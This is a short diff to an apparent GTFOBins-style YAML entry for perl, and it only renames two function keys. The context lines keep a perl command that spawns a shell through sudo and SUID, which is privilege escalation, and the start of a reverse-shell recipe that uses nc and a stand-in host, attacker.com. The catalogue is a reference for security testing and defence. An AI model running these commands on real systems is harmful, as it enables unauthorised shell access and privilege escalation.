@@ -1,12 +1,12 @@
 ---
 functions:
-  exec-interactive:
+  execute-interactive:
     - code: perl -e 'exec "/bin/sh";'
   sudo-enabled:
     - code: sudo perl -e 'exec "/bin/sh";'
   suid-enabled:
     - code: ./perl -e 'exec "/bin/sh";'
-  reverse-shell:
+  reverse-shell-interactive:
     - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
       code: |
         export RHOST=attacker.com
